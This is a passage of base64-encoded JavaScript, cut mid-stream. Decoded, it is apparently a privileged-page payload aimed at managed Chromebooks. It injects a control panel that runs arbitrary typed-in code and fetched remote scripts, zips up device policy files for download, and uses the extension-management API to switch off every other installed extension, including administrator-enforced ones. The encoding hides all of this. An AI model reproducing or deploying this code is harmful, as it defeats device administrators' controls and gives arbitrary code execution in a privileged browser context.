ByZXZpZXdpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICBkaXYuYXBwZW5kQ2hpbGQocHJldmlld0J1dHRvbik7CiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxpc3QuYXBwZW5kQ2hpbGQoZGl2KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB0aGl6LnRhYkxpc3RJblByb2dyZXNzID0gZmFsc2U7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBhY3RpdmF0ZSgpIHsKICAgICAgICBkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgKICAgICAgICAgICAgImJlZm9yZWVuZCIsCiAgICAgICAgICAgIERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMudGVtcGxhdGUKICAgICAgICApOwoKICAgICAgICBkb2N1bWVudC5ib2R5CiAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZXh0X2RlZmF1bHQiKQogICAgICAgICAgICAucXVlcnlTZWxlY3RvckFsbCgiYnV0dG9uIikKICAgICAgICAgICAgLmZvckVhY2goZnVuY3Rpb24oYnRuKSB7CgogICAgICAgICAgICAgICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgdGhpcy5vbkJ0bkNsaWNrXy5iaW5kKHRoaXMsIGJ0bikpOwogICAgICAgICAgICB9LCB0aGlzKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNmb3JyZWVucm9sbCIpCiAgICAgICAgICAgIC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGFzeW5jIGZ1bmN0aW9uIGhhbmRsZXJfKHRhcikgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coISgnSlNaaXAnIGluIHdpbmRvdykpOwogICAgICAgICAgICAgICAgaWYgKCEoJ0pTWmlwJyBpbiB3aW5kb3cpKSB7CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5ldmFsQ29kZShhd2FpdCAoYXdhaXQgZmV0Y2goImh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2pzemlwLzMuMTAuMS9qc3ppcC5taW4uanMiKSkudGV4dCgpKTsKICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGhhbmRsZXJfKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiY3JlYXRpbmcgemlwIik7CiAgICAgICAgICAgICAgICBjb25zdCB6aXBGaWxlID0gbmV3IEpTWmlwKCk7CiAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IGYgb2Yga0ZpbGVzKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGJ1ZmZlcjsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBidWZmZXIgPSBhd2FpdCByZWFkRmlsZShmKTsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJjb3VsZCBub3QgcmVhZCBmaWxlICIgKyBmKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHppcEZpbGUuZmlsZShwb3NpeC5iYXNlbmFtZShmKSwgbmV3IFVpbnQ4QXJyYXkoYnVmZmVyKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB6aXBGaWxlLmZpbGUocG9zaXguYmFzZW5hbWUoYXdhaXQgZmluZExhc3RQb2xpY3lGaWxlKCkpLCBhd2FpdCByZWFkRmlsZShhd2FpdCBmaW5kTGFzdFBvbGljeUZpbGUoKSkpOwogICAgICAgICAgICAgICAgY29uc3QgdXJsID0gVVJMLmNyZWF0ZU9iamVjdFVSTChhd2FpdCB6aXBGaWxlLmdlbmVyYXRlQXN5bmMoewogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJibG9iIgogICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgY29uc3QgYWVsZW0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7CiAgICAgICAgICAgICAgICBhZWxlbS5ocmVmID0gdXJsOwogICAgICAgICAgICAgICAgYWVsZW0uZG93bmxvYWQgPSAiIjsKICAgICAgICAgICAgICAgIGFlbGVtLmNsaWNrKCk7CiAgICAgICAgICAgIH0pCgogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgIGZvciAobGV0IGkgaW4gY2hyb21lLnRhYnMpIHsKICAgICAgICAgICAgaWYgKGkuc3RhcnRzV2l0aCgib24iKSkgewogICAgICAgICAgICAgICAgY2hyb21lLnRhYnNbaV0uYWRkTGlzdGVuZXIoKCkgPT4gewogICAgICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfQogICAgc3RhdGljIGdldEZTKCkgewogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFRFTVBPUkFSWSwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICB9KTsKICAgIH0KICAgIHN0YXRpYyBhc3luYyB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBzdGF0aWMgYXN5bmMgZXZhbENvZGUoY29kZSkgewogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMud3JpdGVGaWxlKCJzcmMuanMiLCBjb2RlKTsKICAgICAgICBsZXQgc2NyaXB0ID0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgICB9CgogICAgYXN5bmMgb25CdG5DbGlja18oYikgewogICAgICAgIHN3aXRjaCAoYi5pZCkgewogICAgICAgICAgICBjYXNlICJjb2RlX2V2YWx1YXRlIjogewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIkV2YWx1YXRpbmcgY29kZSEiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHggPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZV9pbnB1dCIpLnZhbHVlOwogICAgICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmV2YWxDb2RlKHgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhc2UgInRhYnJlbG9hZCI6IHsKICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CmNsYXNzIEhvc3RQZXJtaXNzaW9ucyB7CiAgICBhY3RpdmF0ZSgpIHt9Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmQobmFtZSwgaWQsIGVuYWJsZWQsIGljb25fdXJsKSB7CiAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZCI7CgogIGNvbnN0IGhlYWRlckRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGhlYWRlckRpdi5jbGFzc05hbWUgPSAiZXh0ZW5zaW9uLWhlYWRlciI7CgogIGNvbnN0IGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICBpY29uLmNsYXNzTmFtZSA9ICJleHRlbnNpb24taWNvbiI7CiAgaWNvbi5zcmMgPSBpY29uX3VybDsKICBpY29uLmFsdCA9ICJFeHRlbnNpb24gSWNvbiI7CgogIGNvbnN0IG5hbWVEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBuYW1lRGl2LmNsYXNzTmFtZSA9ICJleHRlbnNpb24tbmFtZSI7CiAgbmFtZURpdi50ZXh0Q29udGVudCA9IG5hbWU7CgogIGhlYWRlckRpdi5hcHBlbmRDaGlsZChpY29uKTsKICBoZWFkZXJEaXYuYXBwZW5kQ2hpbGQobmFtZURpdik7CgogIGNvbnN0IGlkRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgaWREaXYuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1pZCI7CiAgaWREaXYudGV4dENvbnRlbnQgPSBpZDsKCiAgY29uc3Qgc3dpdGNoTGFiZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwogIHN3aXRjaExhYmVsLmNsYXNzTmFtZSA9ICJzd2l0Y2giOwoKICBjb25zdCBjaGVja2JveCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgY2hlY2tib3gudHlwZSA9ICJjaGVja2JveCI7CiAgaWYgKGVuYWJsZWQpIGNoZWNrYm94LmNoZWNrZWQgPSB0cnVlOwoKICBjb25zdCBzbGlkZXJTcGFuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogIHNsaWRlclNwYW4uY2xhc3NOYW1lID0gInNsaWRlciI7CgogIHN3aXRjaExhYmVsLmFwcGVuZENoaWxkKGNoZWNrYm94KTsKICBzd2l0Y2hMYWJlbC5hcHBlbmRDaGlsZChzbGlkZXJTcGFuKTsKCiAgbGkuYXBwZW5kQ2hpbGQoaGVhZGVyRGl2KTsKICBsaS5hcHBlbmRDaGlsZChpZERpdik7CiAgbGkuYXBwZW5kQ2hpbGQoc3dpdGNoTGFiZWwpOwoKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmRBbGwoZW5hYmxlZCA9IHRydWUpIHsKICBjb25zdCBsaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgbGkuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1jYXJkLWFsbCI7CiAgbGkuaW5uZXJIVE1MID0gYAogICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLWhlYWRlciI+CiAgICAgIDxpbWcgY2xhc3M9ImV4dGVuc2lvbi1pY29uIiBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML1QzTTFONEwvcmVmcy9oZWFkcy9tYWluL2ltYWdlcy9YT3NYLmdpZiIgLz4KICAgICAgPGRpdiBjbGFzcz0iZXh0ZW5zaW9uLW5hbWUiPkFsbCBFeHRlbnNpb25zPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxsYWJlbCBjbGFzcz0ic3dpdGNoIj4KICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiAke2VuYWJsZWQgPyAiY2hlY2tlZCIgOiAiIn0+CiAgICAgIDxzcGFuIGNsYXNzPSJzbGlkZXIiPjwvc3Bhbj4KICAgIDwvbGFiZWw+CiAgYDsKICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgbGV0IGNhcmRBbGwgPSBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKCk7CiAgICAgICAgbGV0IGNhcmRJbnB1dEFsbCA9IGNhcmRBbGwucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgY2FyZElucHV0QWxsLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIChldmVudCkgPT4gewogICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRTZWxmKGZ1bmN0aW9uKHNlbGYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldEFsbChmdW5jdGlvbihleHRlbnNpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICBhbGVydCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciBsb2FkaW5nIGV4dGVuc2lvbnM6ICIgKyBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVqZWN0KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9taXNlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZXh0ZW5zaW9ucy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0SWQgPSBleHRlbnNpb25zW2ldLmlkOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWQgIT09IHNlbGYuaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb21pc2VzLnB1c2goCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChleHRJZCwgZXZlbnQudGFyZ2V0LmNoZWNrZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFByb21pc2UuYWxsKHByb21pc2VzKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGVuYWJsaW5nL2Rpc2FibGluZyBleHRlbnNpb25zOiAiICsgZXJyb3IubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmRBbGwpOwoKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0bGlzdCkgewogICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICBhbGVydCgiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCBvcmRsaXN0ID0gW107CiAgICAgICAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbihleHRlbnNpb24pIHsKICAgICAgICAgICAgICAgIGlmIChleHRlbnNpb24uaWQgPT09IG5ldyBVUkwobmV3IFVSTChsb2NhdGlvbi5ocmVmKS5vcmlnaW4pLmhvc3QpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBvcmRsaXN0LnB1c2goZXh0ZW5zaW9uKTsKCiAgICAgICAgICAgICAgICBjb25zdCBpY29uID0KICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmZpbmQoKGljKSA9PiBpYy5zaXplID09PSAxMjgpID8/CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5hdCgtMSk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmQgPSBjcmVhdGVFeHRlbnNpb25DYXJkKAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5uYW1lLAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pZCwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uZW5hYmxlZCwKICAgICAgICAgICAgICAgICAgICBpY29uPy51cmwgfHwKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvVDNNMU40TC9yZWZzL2hlYWRzL21haW4vaW1hZ2VzL1hPc1guZ2lmIgogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICBsZXQgY2FyZElucHV0ID0gY2FyZC5xdWVyeVNlbGVjdG9yKCJpbnB1dCIpOwoKICAgICAgICAgICAgICAgIGNhcmRJbnB1dC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50LnRhcmdldC5jaGVja2VkLAogICAgICAgICAgICAgICAgICAgICAgICAocmVzdWx0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciB1cGRhdGluZyBleHRlbnNpb24gc3RhdHVzOiAiICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGNhcmQucXVlcnlTZWxlY3RvcigiLmV4dGVuc2lvbi1pY29uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVzZXJkZWZJZHMuaW5jbHVkZXMoZXh0ZW5zaW9uLmlkKSkgewogICAgICAgICAgICAgICAgICAgICAgICB1c2VyZGVmSWRzLnJlbW92ZShleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJyZW1vdmVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiBmcm9tIHRoZSBsaXN0IiwgMik7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5wdXNoKGV4dGVuc2lvbi5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkodXNlcmRlZklkcykpOwogICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoImFkZGVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiB0byB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT09IEpTT04uc3RyaW5naWZ5KFtdKSkgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IGlubGluZTsiKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBleHRsaXN0X2VsZW1lbnQuYXBwZW5kQ2hpbGQoY2FyZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBzYXZlZEV4dExpc3QgPSBvcmRsaXN0OwogICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKY29uc3QgZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUgPSBgCiAgPGRpdiBpZD0iZmlsZU1hbmFnZXJQcml2YXRlX2NhcCI+CiAgICA8ZGl2IGlkPSJGTVBfb3BlblVSTCI+CiAgICAgIDxidXR0b24gaWQ9ImJ0bl9GTVBfb3BlblVSTCI+T3BlbiBVUkwgaW4gU2tpb3ZveCB3aW5kb3c8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgoKYDsKY29uc3QgaHRtbFN0eWxlID0gYAo8c3R5bGU+CkBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVJvYm90bzp3Z2h0QDQwMCZkaXNwbGF5PXN3YXAnKTsKCiogewogIGZvbnQtZmFtaWx5OiAnUm9ib3RvJywgQXJpYWwsIHNhbnMtc2VyaWY7Cn0KCmJvZHkgewogIGJhY2tncm91bmQtY29sb3I6ICMxZTFmMjI7CiAgY29sb3I6ICNmZmY7CiAgbWFyZ2luOiAwOwogIHBhZGRpbmc6IDIwcHg7Cn0KCmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2c6Oi13ZWJraXQtc2Nyb2xsYmFyLApkaWFsb2cgZGl2Ojotd2Via2l0LXNjcm9sbGJhciB7CiAgZGlzcGxheTogbm9uZTsKfQoKcCB7CiAgbWFyZ2luOiA1cHggYXV0bzsKICBjb2xvcjogd2hpdGU7Cn0KCiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCwgI2V4dF9kZWZhdWx0IHsKICBtYXgtd2lkdGg6IDEyMDBweDsKICBtYXJnaW46IDAgYXV0bzsKfQoKaDEgewogIGZvbnQtc2l6ZTogMjRweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgouZGVzY3JpcHRpb24gewogIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KCnVsIHsKICBsaXN0LXN0eWxlLXR5cGU6IG5vbmU7CiAgcGFkZGluZzogMDsKICBtYXJnaW46IDA7CiAgcGFkZGluZy1ib3R0b206IDUwcHg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LXdyYXA6IHdyYXA7CiAgZ2FwOiAxMHB4OwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgouZXh0ZW5zaW9uLWNhcmQsIC5leHRlbnNpb24tY2FyZC1hbGwgewogIG1hcmdpbi1sZWZ0OiA1cHg7CiAgbWFyZ2luLWJvdHRvbTogNnB4OwogIGJhY2tncm91bmQ6ICMyOTJhMmQ7CiAgYm9yZGVyLXJhZGl1czogMTBweDsKICB3aWR0aDogMzc1cHg7CiAgaGVpZ2h0OiAxNDBweDsKICBwYWRkaW5nOiAxMHB4OwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICBnYXA6IDEwcHg7CiAgcGFkZGluZzogMTBweDsKICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgYm94LXNoYWRvdzogMCA0cHggOHB4IHJnYmEoMCwgMCwgMCwgMC4yKTsKfQoKLmV4dGVuc2lvbi1oZWFkZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICBtYXJnaW4tYm90dG9tOiAyNXB4OwogIG1hcmdpbi10b3A6IDEwcHg7Cn0KCi5leHRlbnNpb24taWNvbiB7CiAgd2lkdGg6IDMycHg7CiAgaGVpZ2h0OiAzMnB4OwogIGZsZXgtc2hyaW5rOiAwOwogIHVzZXItc2VsZWN0OiBub25lOwogIG1hcmdpbi1sZWZ0OiAxMHB4OwogIG1hcmdpbi1yaWdodDogMTBweDsKfQoKLmV4dGVuc2lvbi1uYW1lIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6IHdoaXRlOwp9CgouZXh0ZW5zaW9uLWlkIHsKICBmb250LXNpemU6IDEzcHg7CiAgY29sb3I6ICNjNGM3YzU7CiAgbWFyZ2luLWxlZnQ6IDEwcHg7Cn0KCi5zd2l0Y2ggewogICAgcG9zaXRpb246IGFic29sdXRlOwogICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgd2lkdGg6IDI4cHg7CiAgICBoZWlnaHQ6IDE2cHg7CiAgICByaWdodDogMjBweDsKICAgIGJvdHRvbTogMTVweDsKfQoKLnN3aXRjaCBpbnB1dCB7CiAgb3BhY2l0eTogMDsKICB3aWR0aDogMDsKICBoZWlnaHQ6IDA7Cn0KCi5zbGlkZXIgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBjdXJzb3I6IHBvaW50ZXI7CiAgdG9wOiAwOwogIGxlZnQ6IDA7CiAgcmlnaHQ